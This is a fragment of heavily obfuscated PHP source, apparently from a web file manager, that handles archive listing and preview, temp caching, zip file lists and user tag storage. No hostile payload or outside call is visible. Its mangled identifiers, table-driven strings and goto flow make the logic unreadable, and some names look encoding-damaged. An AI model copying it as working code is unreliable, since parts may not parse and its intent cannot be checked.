$¦Î—ƒÚ = isset($Ö¸÷ˆ¦[$ğÜãÔØù[1217]]) ? $Ö¸÷ˆ¦[$ğÜãÔØù[1217]] : -1; $ûÆ”á±ê = 50000; if (request_url_safe($«æÅì–°)) { $Ã¼·áÓ = parse_url_query($«æÅì–°); if (!isset($Ã¼·áÓ[$ğÜãÔØù[84]])) { show_json($ğÜãÔØù[1218], !1); } } $¸òˆ—œë = isset($Ã¼·áÓ) ? $Ã¼·áÓ[$ğÜãÔØù[84]] : $«æÅì–°; $¿ä¸«ë = self::info($¸òˆ—œë); $Ëí—Ú½— = self::fileExt($¿ä¸«ë); $ŒÌç¢ê = self::tmpFileName($¿ä¸«ë); if (isset($Ã¼·áÓ)) { $óç‡§œß = array($Ã¼·áÓ[$ğÜãÔØù[84]], $Ã¼·áÓ[$ğÜãÔØù[1217]], $Ã¼·áÓ[$ğÜãÔØù[32]]); $ş©¬ƒóî = md5(implode($ğÜãÔØù[11], $óç‡§œß)) . $ğÜãÔØù[10] . get_path_ext($Ã¼·áÓ[$ğÜãÔØù[32]]); } else { $óç‡§œß = array($¿ä¸«ë[$ğÜãÔØù[32]], $¿ä¸«ë[$ğÜãÔØù[84]], $¿ä¸«ë[$ğÜãÔØù[76]]); $ş©¬ƒóî = md5(implode($ğÜãÔØù[11], $óç‡§œß)) . $ğÜãÔØù[10] . $Ëí—Ú½—; } if ($¦Î—ƒÚ == -1) { $şàğü‘Ñ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\126\x69\x65\167\57{$ŒÌç¢ê}\x2f{$ş©¬ƒóî}\56\x6c\x6f\147"; $ÕÇÖßæÖ = self::infoFull($şàğü‘Ñ); if ($ÕÇÖßæÖ) { $şàğü‘Ñ = $ÕÇÖßæÖ[$ğÜãÔØù[84]]; $Ï´±†ö¹ = self::getContent($şàğü‘Ñ); if ($Ï´±†ö¹) { $ß›Â„Š“ = json_decode($Ï´±†ö¹, !0); $ß›Â„Š“ = is_array($ß›Â„Š“) ? $ß›Â„Š“ : array(); if (count($ß›Â„Š“) >= $ûÆ”á±ê) { show_json(sprintf(LNG($ğÜãÔØù[1219]), count($ß›Â„Š“)), !1); } return $ß›Â„Š“; } } else { $şàğü‘Ñ = self::mkfile($şàğü‘Ñ); } } $òÎ´¡Ğ = TEMP_FILES . $ŒÌç¢ê; if (!is_dir($òÎ´¡Ğ)) { mk_dir($òÎ´¡Ğ); } $Ñé°ö = $òÎ´¡Ğ . $ğÜãÔØù[8] . $ş©¬ƒóî; if (!@file_exists(self::iconvSystem($Ñé°ö))) { if (isset($Ã¼·áÓ)) { url_request($«æÅì–°, $ğÜãÔØù[1220], $Ñé°ö); } else { $«ıëÁÁ = self::localFilePath($«æÅì–°, $Ëí—Ú½—); $Ñé°ö = $«ıëÁÁ ? $«ıëÁÁ : self::download($«æÅì–°, $Ñé°ö); } } $Ñé°ö = self::iconvSystem($Ñé°ö); if ($¦Î—ƒÚ >= 0) { $Œ‹ƒéÜ = isset($Ö¸÷ˆ¦[$ğÜãÔØù[1221]]) ? $Ö¸÷ˆ¦[$ğÜãÔØù[1221]] : !1; $è¸¥…ìÎ = isset($Ö¸÷ˆ¦[$ğÜãÔØù[32]]) ? $Ö¸÷ˆ¦[$ğÜãÔØù[32]] : $ğÜãÔØù[12]; KodArchive::filePreview($Ñé°ö, $¦Î—ƒÚ, $Œ‹ƒéÜ, $è¸¥…ìÎ); self::archiveExt(); die; } $”·ŸÂÖ’ = KodArchive::listContent($Ñé°ö); self::archiveExt(); del_dir($òÎ´¡Ğ); if (!$”·ŸÂÖ’[$ğÜãÔØù[1213]]) { show_json($”·ŸÂÖ’[$ğÜãÔØù[1215]], !1); } $ß›Â„Š“ = json_encode($”·ŸÂÖ’[$ğÜãÔØù[1215]]); self::setContent($şàğü‘Ñ, $ß›Â„Š“); if (count($”·ŸÂÖ’[$ğÜãÔØù[1215]]) >= $ûÆ”á±ê) { show_json(sprintf(LNG($ğÜãÔØù[1219]), count($”·ŸÂÖ’[$ğÜãÔØù[1215]])), !1); } return $”·ŸÂÖ’[$ğÜãÔØù[1215]]; } private static function fileExt($ª¶Ø…àì) { $Œì´‚ê‚ =& $_SERVER[ä¿÷‹µ±]; $æÍ‹è¶Ä = $ª¶Ø…àì[$Œì´‚ê‚[174]]; if ($æÍ‹è¶Ä == $Œì´‚ê‚[1222]) { $¥©Ö–‚ğ = $Œì´‚ê‚[1223]; if (substr($ª¶Ø…àì[$Œì´‚ê‚[32]], -strlen($¥©Ö–‚ğ)) == $¥©Ö–‚ğ) { $æÍ‹è¶Ä = $Œì´‚ê‚[1224]; } } self::archiveExt($æÍ‹è¶Ä); return $æÍ‹è¶Ä; } private static function zipFileList($ˆ¢ÏçÑŒ, $ú·½˜¹« = false) { $ùÁİøä =& $_SERVER[ä¿÷‹µ±]; $Ù‘‡²ƒ° = array(); foreach ($ˆ¢ÏçÑŒ as $çã¿é®Ú) { $—ëµƒÅş = $çã¿é®Ú[$ùÁİøä[84]]; if ($ú·½˜¹«) { $—ëµƒÅş = self::copy($çã¿é®Ú[$ùÁİøä[84]], $ú·½˜¹«, $ùÁİøä[837]); } else { $ŸîÍ¥ù‚ = self::init($çã¿é®Ú[$ùÁİøä[84]]); if ($ŸîÍ¥ù‚->getType() == $ùÁİøä[106]) { $—ëµƒÅş = $ŸîÍ¥ù‚->path; } } if ($—ëµƒÅş && self::local()->exist($—ëµƒÅş)) { $Ù‘‡²ƒ°[$çã¿é®Ú[$ùÁİøä[84]]] = $—ëµƒÅş; } } if (!empty($Ù‘‡²ƒ°)) { return array_values($Ù‘‡²ƒ°); } show_json(LNG($ùÁİøä[1188]), !1); } public static function tmpFileName($¯ÕéÏ¼) { $±ï¬á½³ =& $_SERVER[ä¿÷‹µ±]; $ÁÕéª˜ô = array($¯ÕéÏ¼[$±ï¬á½³[32]], $¯ÕéÏ¼[$±ï¬á½³[84]], $¯ÕéÏ¼[$±ï¬á½³[76]], $¯ÕéÏ¼[$±ï¬á½³[521]]); return md5(implode($±ï¬á½³[11], $ÁÕéª˜ô)); } private static function localFilePath($Éóµ‡µ, $‹ï°®ò) { $Ÿêı–†ç =& $_SERVER[ä¿÷‹µ±]; if ($‹ï°®ò == $Ÿêı–†ç[1225] && strtoupper(substr(PHP_OS, 0, 3)) == $Ÿêı–†ç[1226]) { return !1; } $…’©´™ = KodIO::parse($Éóµ‡µ); if ($…’©´™[$Ÿêı–†ç[33]] == KodIO::KOD_SOURCE) { $ï“Ïä¥˜ = Model($Ÿêı–†ç[844])->fileInfoGet(KodIO::sourceID($Éóµ‡µ)); if (!$ï“Ïä¥˜[$Ÿêı–†ç[84]]) { show_json($Ÿêı–†ç[1227], !1); } $Éóµ‡µ = $ï“Ïä¥˜[$Ÿêı–†ç[84]]; } $‹™ÔÚ = self::init($Éóµ‡µ); if ($‹™ÔÚ->pathParse[$Ÿêı–†ç[1173]]) { $Éóµ‡µ = $‹™ÔÚ->pathParse[$Ÿêı–†ç[1173]]; $‹™ÔÚ = self::init($Éóµ‡µ); } $²ãáË = $‹™ÔÚ->getType(); if ($²ãáË == $Ÿêı–†ç[106] || $²ãáË == $Ÿêı–†ç[1228]) { if (!$‹™ÔÚ->exist($‹™ÔÚ->path)) { show_json(LNG($Ÿêı–†ç[105]), !1); } return $‹™ÔÚ->path; } return !1; } private static function archiveExt($ô¦£Ñøá = '') { $GLOBALS[$_SERVER[ä¿÷‹µ±][1229]] = $ô¦£Ñøá; } } goto dãïÔß„Ñœ; CÇ®ªÀ§ã: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($ŒØæã») { $æí”éİ¨ =& $_SERVER[ä¿÷‹µ±]; return array($æí”éİ¨[1961] => array($æí”éİ¨[2341] . USER_ID, $æí”éİ¨[1962])); } protected function listData() { $óÑ±† Û =& $_SERVER[ä¿÷‹µ±]; $£¯õ¸Íé = array($óÑ±† Û[1669] => USER_ID, $óÑ±† Û[484] => array($óÑ±† Û[1965], 0)); $„´ß = $óÑ±† Û[2342]; $Ä¨ó‰ÑÙ = $this->field($„´ß)->where($£¯õ¸Íé)->order($óÑ±† Û[1968])->select(); return $Ä¨ó‰ÑÙ ? $Ä¨ó‰ÑÙ : array(); } protected function addToTag($±ÆÒ»æÉ, $¬¢Öêà) { $šù¸«ıí =& $_SERVER[ä¿÷‹µ±]; if (!Model($šù¸«ıí[2105])->listData($¬¢Öêà)) { return !1; } if (is_numeric($±ÆÒ»æÉ)) { $§ş¹ï¯ = Model($šù¸«ıí[844])->pathInfo($±ÆÒ»æÉ); if (!$§ş¹ï¯) { return !1; } } else { $§ş¹ï¯ = IO::infoSimple($±ÆÒ»æÉ); if (!$§ş¹ï¯) { return !1; } $Å˜‚úù³ = $§ş¹ï¯[$šù¸«ıí[32]]; $”³¢âï = $§ş¹ï¯[$šù¸«ıí[33]]; if (isset($§ş¹ï¯[$šù¸«ıí[410]])) { $”³¢âï = $§ş¹ï¯[$šù¸«ıí[410]] == $šù¸«ıí[88] ? $šù¸«ıí[75] : $šù¸«ıí[199]; } } $×¤½šâÃ = array($šù¸«ıí[1669] => USER_ID, $šù¸«ıí[484] => $¬¢Öêà, $šù¸«ıí[421] => $±ÆÒ»æÉ, $šù¸«ıí[422] => $”³¢âï ? $”³¢âï : $šù¸«ıí[416], $šù¸«ıí[420] => $Å˜‚úù³ ? $Å˜‚úù³ : $šù¸«ıí[12], $šù¸«ıí[1854] => 0); if ($this->where($×¤½šâÃ)->find()) { return !1; } return $this->add($×¤½šâÃ); } protected function removeFromTag($ÉüÄÏÉœ, $Ï¦Ó÷–·) { $ò¸Ş¨„ =& $_SERVER[ä¿÷‹µ±]; if (!Model($ò¸Ş¨„[2105])->listData($Ï¦Ó÷–·)) { return !1; } if (is_array($ÉüÄÏÉœ)) { $ÉüÄÏÉœ = array($ò¸Ş¨„[7], $ÉüÄÏÉœ); } $‚µÌ” = array($ò¸Ş¨„[1669] => USER_ID, $ò¸Ş¨„[484] => $Ï¦Ó÷–·, $ò¸Ş¨„[421] => $ÉüÄÏÉœ); return $this->where($‚µÌ”)->delete(); } protected function removeByTag($šÌ·¯¤Ä) { $¦ı£‚ÒÍ =& $_SERVER[ä¿÷‹µ±]; if (!$šÌ·¯¤Ä) { return !1; } $¼‚­¿–¢ = array($¦ı£‚ÒÍ[1669] => USER_ID, $¦ı£‚ÒÍ[484] => $šÌ·¯¤Ä); return $this->where($¼‚­¿–¢)->delete(); } protected function removeBySource($‘à¼¤¶¢) { $­±³äàµ =& $_SERVER[ä¿÷‹µ±]; if (is_array($‘à¼¤¶¢)) { $‘à¼¤¶¢ = array($­±³äàµ[7], $‘à¼¤¶¢); } $óåøø‰ = array($­±³äàµ[1669] => USER_ID, $­±³äàµ[484] => array($­±³äàµ[1036], 0), $­±³äàµ[421] => $‘à¼¤¶¢); return $this->where($óåøø‰)->delete(); } }